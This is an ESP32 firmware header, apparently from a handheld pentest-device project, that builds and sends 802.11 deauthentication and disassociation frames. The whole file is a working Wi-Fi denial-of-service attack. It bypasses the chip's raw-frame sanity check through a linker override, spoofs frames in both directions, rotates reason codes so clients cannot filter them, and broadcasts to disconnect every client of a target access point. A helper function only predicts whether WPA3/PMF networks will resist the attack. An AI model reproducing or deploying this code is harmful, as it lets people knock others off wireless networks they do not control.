/*
 * wifi_deauth_frame — shared 802.11 deauth/disassoc frame builder.
 *
 * Modeled on Bruce's `stationDeauth` + `buildOptimizedDeauthFrame`
 * (https://github.com/pr3y/Bruce) which is the pattern that actually
 * lands on-air under IDF 5.3/5.5 blobs. Previous revisions of this
 * file used Marauder's silent-AP pattern, which the blob still filters
 * even with patched libs — confirmed on-device with rc=258.
 *
 * Bruce's recipe:
 *   1. esp_wifi_stop + re-init with WIFI_INIT_CONFIG_DEFAULT
 *   2. esp_wifi_set_mode(WIFI_MODE_STA)
 *   3. promiscuous filter = FILTER_MASK_ALL, enable promiscuous
 *   4. set_channel on the target AP's channel
 *   5. set_max_tx_power(78) for range
 *   6. TX via esp_wifi_80211_tx(WIFI_IF_AP, ...)
 *
 * Every deauth/disassoc fires 4 frames per pair per client:
 *   AP  → STA  deauth (type 0xC)
 *   AP  → STA  disassoc (type 0xA)
 *   STA → AP   deauth     (reverse direction — some client drivers honor
 *   STA → AP   disassoc    this but not the AP→STA form)
 *
 * Reason codes cycle through {0x01, 0x04, 0x06, 0x07, 0x08} every 20
 * iterations so a static-reason filter on the client can't just ignore us.
 */
#pragma once

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

/* esp_wifi_80211_tx calls ieee80211_raw_frame_sanity_check which filters
 * out deauth (0xC) and disassoc (0xA) subtypes. The internal TX path
 * skips that check — these symbols exist in the pioarduino / Bruce libs
 * but aren't declared in public headers. */
extern "C" {
    esp_err_t esp_wifi_internal_tx(wifi_interface_t ifx, void *buffer, uint16_t len);
}

/*
 * Bring WiFi into the Bruce-style "enhanced mode" for raw TX:
 * STA mode + promiscuous ALL-filter + channel locked + max tx power.
 * Tears down any existing WiFi state before re-initializing.
 *
 * Returns ESP_OK on success. On failure the caller should abort the
 * feature — TX will not work.
 */
/* Pure STA + raw-TX pattern (Porkchop-style — see
 * github.com/0ct0sec/M5PORKCHOP/src/core/wsl_bypasser.cpp). Linker
 * override in src/features/wifi_sanity_override.cpp nulls out
 * ieee80211_raw_frame_sanity_check, so deauth/disassoc frames TX
 * cleanly on WIFI_IF_STA without needing softAP authorization.
 *
 * Why this beats the old per-hop softAP pattern:
 *   - softAP teardown/rebuild every hop thrashed the AP TX buffer
 *     pool → ESP_ERR_NO_MEM (257) on >50% of frames
 *   - APSTA mode doubles WiFi static + dynamic buffers → ~30 KB extra
 *     heap pressure → eventual "Arduino Event Malloc Failed" crash
 *   - WiFi.softAP attach races esp_wifi_start → LoadProhibited 0x2c
 *     null-deref under heap pressure
 *
 * Now: WIFI_STA stays up across the whole session. silent_ap_begin
 * just sets channel + promiscuous filter (once); silent_ap_end is
 * essentially a no-op kept for source compat with existing callers. */
static inline void wifi_silent_ap_set_source_mac(const uint8_t *mac) { (void)mac; }

static inline esp_err_t wifi_silent_ap_begin(uint8_t channel)
{
    if (!channel) channel = 1;

    /* Make sure we're in STA mode. Query the actual driver via the
     * IDF API — Arduino's WiFi.getMode() returns a CACHED value that
     * goes stale when WiFi was init'd via raw esp_wifi_init() (e.g.
     * Triton's lean init). If we call Arduino's WiFi.mode() on a
     * stale-OFF cache, it re-tries esp_netif_create_default_wifi_sta
     * and asserts because the netif already exists. */
    wifi_mode_t mode_now = WIFI_MODE_NULL;
    esp_wifi_get_mode(&mode_now);
    if (mode_now != WIFI_MODE_STA) {
        esp_wifi_set_mode(WIFI_MODE_STA);
        delay(20);
    }

    /* Promiscuous filter = ALL (Porkchop's setting). Our earlier comment
     * claimed FILTER_MASK_ALL "floods the buffer pool and starves TX"
     * but that was masking the real bug (the softAP TX pool was the
     * culprit, not the promisc RX queue). CTRL frames are short, static
     * RX buffer count gates RX memory, and Porkchop runs ALL stably with
     * higher capture rates than our previous combo. */
    /* Explicit MASK_ALL — passing nullptr to esp_wifi_set_promiscuous_filter
     * on IDF 5.5 disables the filter outright on some builds (capture
     * goes dead), not "reset to ALL" as the older docs implied. */
    static const wifi_promiscuous_filter_t s_all_filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&s_all_filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    /* esp_wifi_set_max_tx_power removed — Evil-Cardputer never sets
     * it per-burst and runs stably. Per-burst toggling could put the
     * driver into a flaky state mid-session. If caller wants max
     * power, set it ONCE at session entry, not here. */
    return ESP_OK;
}

static inline void wifi_silent_ap_end(void)
{
    /* No-op in the STA-only pattern. softAP isn't running so there's
     * nothing to tear down. Callers that previously rearmed promisc
     * after this no longer need to — we never disabled it. */
}

/*
 * Build a 26-byte deauth or disassoc frame. Bruce's exact layout.
 * Reason code and seq are caller-provided so reason-cycling and
 * per-frame seq increment work above this layer.
 */
static inline void _deauth_build(uint8_t *frame,
                                 const uint8_t dest[6],
                                 const uint8_t src[6],
                                 const uint8_t bssid[6],
                                 uint8_t reason,
                                 bool is_disassoc,
                                 uint16_t seq)
{
    frame[0] = is_disassoc ? 0xA0 : 0xC0;
    frame[1] = 0x00;
    /* Duration set to 0 — Bruce does this. Some blobs reject non-zero
     * duration on raw TX even though 802.11 allows it. */
    frame[2] = 0x00;
    frame[3] = 0x00;
    memcpy(&frame[4],  dest,  6);
    memcpy(&frame[10], src,   6);
    memcpy(&frame[16], bssid, 6);
    /* Bruce's seq layout — MSB-first, low nibble in high nibble of byte 23.
     * Spec says little-endian but Bruce's form is what we see on-air from
     * working captures, so matching it. */
    frame[22] = (uint8_t)((seq >> 4) & 0xFF);
    frame[23] = (uint8_t)((seq & 0x0F) << 4);
    frame[24] = reason;
    frame[25] = 0x00;
}

/*
 * Fire a full deauth+disassoc burst at `dst` via `bssid`. Four frames
 * total per call: AP→STA pair + STA→AP reverse pair. `seq` is the
 * caller-owned counter, incremented once per frame.
 */
static inline int wifi_deauth_pair(const uint8_t dst[6],
                                   const uint8_t bssid[6],
                                   uint16_t *seq)
{
    /* Rotate reason codes — clients that filter on a single fixed reason
     * can't just drop us. Rotates every call. */
    static const uint8_t REASONS[5] = {0x01, 0x04, 0x06, 0x07, 0x08};
    static uint8_t reason_idx = 0;
    uint8_t reason = REASONS[reason_idx];
    reason_idx = (reason_idx + 1) % 5;

    uint8_t ap_to_sta_deauth[26], ap_to_sta_dis[26];
    uint8_t sta_to_ap_deauth[26], sta_to_ap_dis[26];

    /* AP → STA: dest=client, src=AP, bssid=AP */
    _deauth_build(ap_to_sta_deauth, dst, bssid, bssid, reason, false, (*seq)++);
    _deauth_build(ap_to_sta_dis,    dst, bssid, bssid, reason, true,  (*seq)++);

    /* STA → AP (reverse): dest=AP, src=client, bssid=AP.
     * Some client drivers honor deauth-from-us-as-STA that they ignore
     * from the AP direction. Symmetric pair doubles kick rate. */
    _deauth_build(sta_to_ap_deauth, bssid, dst, bssid, reason, false, (*seq)++);
    _deauth_build(sta_to_ap_dis,    bssid, dst, bssid, reason, true,  (*seq)++);

    int ok = 0;
    esp_err_t r;
    /* TX on WIFI_IF_STA — the linker override in wifi_sanity_override.cpp
     * makes raw deauth/disassoc subtypes pass the kernel sanity check.
     * Previously we used WIFI_IF_AP because the override wasn't in place
     * and only an authorized AP could TX mgmt frames. Now that the check
     * is bypassed, STA-interface TX is way more memory-efficient (single
     * mode, no AP TX pool churn). */
    /* 2 ms vTaskDelay between each frame — beacon_spam's working
     * pattern. Without spacing, the 4 back-to-back TXs all queue into
     * the dynamic_tx_buf pool simultaneously; if any prior TX is still
     * waiting for an ACK/timeout the DMA buffer isn't released yet and
     * subsequent calls return ESP_ERR_NO_MEM (257) — exactly what
     * Triton was hitting. 2 ms is enough to let the prior frame drain
     * but doesn't measurably reduce deauth aggression (still 4 frames
     * within 8 ms vs 0 ms previous). */
    r = esp_wifi_80211_tx(WIFI_IF_STA, ap_to_sta_deauth, 26, false); if (r == ESP_OK) ok++;
    vTaskDelay(pdMS_TO_TICKS(2));
    r = esp_wifi_80211_tx(WIFI_IF_STA, ap_to_sta_dis, 26, false); if (r == ESP_OK) ok++;
    vTaskDelay(pdMS_TO_TICKS(2));
    r = esp_wifi_80211_tx(WIFI_IF_STA, sta_to_ap_deauth, 26, false); if (r == ESP_OK) ok++;
    vTaskDelay(pdMS_TO_TICKS(2));
    r = esp_wifi_80211_tx(WIFI_IF_STA, sta_to_ap_dis, 26, false); if (r == ESP_OK) ok++;

    /* Expose the last rc so feature UIs can display it on-screen
     * instead of requiring the user to attach a serial monitor.
     * Defined in wifi_sanity_override.cpp (already a TU we compile
     * for the linker trick). */
    extern volatile int wifi_deauth_last_rc;
    wifi_deauth_last_rc = (int)r;

    if (ok == 0) {
        static uint32_t last_err_log = 0;
        if (millis() - last_err_log > 1000) {
            Serial.printf("[80211_tx] deauth rc=%d (0x%x) — all 4 frames dropped\n",
                          (int)r, (unsigned)r);
            last_err_log = millis();
        }
    }
    return ok;  /* 0..4 */
}

/*
 * Broadcast variant: blast deauth at FF:FF:FF:FF:FF:FF so every STA
 * associated with the target AP gets kicked simultaneously. Still sends
 * the reverse direction too — some clients accept broadcast-deauth from
 * their own MAC even though no AP would normally send that.
 */
static inline int wifi_deauth_broadcast(const uint8_t bssid[6], uint16_t *seq)
{
    static const uint8_t BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    return wifi_deauth_pair(BCAST, bssid, seq);
}

/*
 * PMF/WPA3 hint. Returns true if the auth mode is known to use Protected
 * Management Frames — in which case plain deauth/disassoc is
 * cryptographically dropped and this attack won't land.
 *
 * `auth` comes from ap_t.auth which is `(uint8_t)WiFi.encryptionType(i)`.
 * The numeric values are stable across IDF versions: WPA3_PSK=6,
 * WPA2_WPA3_PSK=7, ENTERPRISE(WPA2-Ent)=5, WPA3_ENT_192=10.
 */
static inline bool wifi_auth_has_pmf(uint8_t auth)
{
    /* PMF-mandatory or PMF-capable auth modes. Numeric values match
     * wifi_auth_mode_t across IDF 4.x / 5.x. */
    switch (auth) {
        case 5:   /* WIFI_AUTH_ENTERPRISE (WPA2-Enterprise) */
        case 6:   /* WIFI_AUTH_WPA3_PSK */
        case 7:   /* WIFI_AUTH_WPA2_WPA3_PSK — WPA3-transition, PMF required */
        case 10:  /* WIFI_AUTH_WPA3_ENT_192 */
        case 11:  /* WIFI_AUTH_WPA3_EXT_PSK */
        case 12:  /* WIFI_AUTH_WPA3_EXT_PSK_MIXED_MODE */
            return true;
        default:
            return false;
    }
}
